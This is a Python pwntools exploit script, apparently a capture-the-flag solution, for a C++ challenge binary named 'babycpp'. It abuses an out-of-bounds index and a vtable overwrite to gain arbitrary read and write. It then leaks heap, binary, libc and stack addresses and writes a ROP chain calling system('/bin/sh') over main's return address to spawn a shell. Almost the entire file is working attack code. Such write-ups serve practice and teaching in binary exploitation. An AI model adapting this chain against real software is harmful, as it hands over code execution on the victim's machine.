#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    #include <stdio.h>
    #include <dlfcn.h>

    void _init()
    {
        printf("%p\\n", *(void **)dlopen(NULL, 1));
    }

    struct container
    {
        void **vtable;
        char hash[16];
        void *field_18;
        char *malloc_ptr;
    };
    struct container no_use;
    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    os.system('gcc -fPIC -shared -g /tmp/gdb_symbols.c -c -o /tmp/gdb_symbols.o && ld -shared -ldl /tmp/gdb_symbols.o -o /tmp/gdb_symbols.so')    
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './babycpp'
sh = 0
if(len(sys.argv) > 1):
    sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
else:
    sh = process(execve_file)
    
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $image_base=$rebase(0)
    set $ptr=(struct container **)$rebase(0x202060)

    define of
        p/x $arg0-$image_base
        end

    define pr
        set $temp=$ptr
        while *$temp
            p **$temp
            set $temp=$temp+1
            end
        end

    define pm
        p/x $image_base
        end

    b *$rebase(0x1508)
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def new_array(_type):
    sh.sendlineafter('Your choice:', '0')
    sh.sendlineafter('Your choice:', str(_type))

def update(old_hash, index, new_hash):
    sh.sendlineafter('Your choice:', '3')
    sh.sendafter('Input array hash:', old_hash)
    sh.sendlineafter('Input idx:', str(index))
    sh.sendafter('Input hash:', new_hash)

def set_string(hash, index, length, content):
    sh.sendlineafter('Your choice:', '2')
    sh.sendafter('Input array hash:', hash)
    sh.sendlineafter('Input idx:', str(index))
    if(length != None):
        sh.sendlineafter('Input the len of the obj:', str(length))
    sh.sendafter('Input your content:', content)

def show_string(hash, index):
    sh.sendlineafter('Your choice:', '1')
    sh.sendafter('Input array hash:', hash)
    sh.sendlineafter('Input idx:', str(index))
    sh.recvuntil('Content:')

def show_int(hash, index):
    sh.sendlineafter('Your choice:', '1')
    sh.sendafter('Input array hash:', hash)
    sh.sendlineafter('Input idx:', str(index))
    sh.recvuntil('The value in the array is ')

def set_int(hash, index, value):
    sh.sendlineafter('Your choice:', '2')
    sh.sendafter('Input array hash:', hash)
    sh.sendlineafter('Input idx:', str(index))
    sh.sendlineafter('Input val:', '%lx' % (value))

hook = 0
hypothetical_int_vtable = '\x1c\xe0'
hypothetical_string_vtable = '\x1d\x00'

if(len(sys.argv) > 1):
    hook = int(sh.readline(), 16)
    log.info('hook: ' + hex(hook))

new_array(1)
update('\0\0', 0, '0')

new_array(2)
update('\x01\0', 0, '1')

new_array(2)
update('\x02\0', 0, '2')


set_string('2', 0, 0x18, 'a' * 8)

if(len(sys.argv) > 1):
    value = hook + 0x201CE0
    value = chr((value & 0xFF00) >> 8) + chr(value & 0xFF)
    update('2', 0x80000000, value[::-1])
else:
    update('2', 0x80000000, hypothetical_int_vtable[::-1])

# leak heap addr
show_int('2', 0)
result = int(sh.readline(), 16)
heap_addr = result - 0x124c0
log.success("heap_addr: " + hex(heap_addr))

container_0_addr = heap_addr + 0x12280
container_0_malloc_ptr_addr = container_0_addr + 0x20


container_2_malloc_ptr_addr = heap_addr + 0x12430
set_int('2', 0, container_2_malloc_ptr_addr + 0x10) # struct string 
set_int('2', 2, container_0_malloc_ptr_addr) # ptr
set_int('2', 3, 0x100) # size



if(len(sys.argv) > 1):
    value = hook + 0x201D00
    value = chr((value & 0xFF00) >> 8) + chr(value & 0xFF)
    update('2', 0x80000000, value[::-1])
else:
    update('2', 0x80000000, hypothetical_string_vtable[::-1])

set_string('2', 0, None, p64(container_0_addr))
show_int('0', 0)
result = int(sh.readline(), 16)
image_base_addr = result - 0x201ce0
log.success("image_base_addr: " + hex(image_base_addr))

set_string('2', 0, None, p64(image_base_addr + elf.got['puts']))
show_int('0', 0)
result = int(sh.readline(), 16)
libc_addr = result - libc.symbols['puts']
log.success("libc_addr: " + hex(libc_addr))

set_string('2', 0, None, p64(libc_addr + libc.symbols['environ']))
show_int('0', 0)
stack_addr = int(sh.readline(), 16)
log.success("stack_addr: " + hex(stack_addr))

main_ret_addr = stack_addr - 0xf0
set_string('2', 0, None, p64(main_ret_addr))

# 0x0000000000001693 : pop rdi ; ret
pop_rdi_ret = 0x0000000000001693
# 0x0000000000000a4e : ret
ret_addr = 0x0000000000000a4e
set_int('0', 0, image_base_addr + ret_addr)
set_int('0', 1, image_base_addr + pop_rdi_ret)
set_int('0', 2, libc_addr + libc.search('/bin/sh\0').next())
set_int('0', 3, libc_addr + libc.symbols['system'])

set_int('0', 4, image_base_addr + pop_rdi_ret)
set_int('0', 5, 0)
set_int('0', 6, libc_addr + libc.symbols['exit'])

# exit
sh.sendlineafter('Your choice:', '4')

sh.interactive()
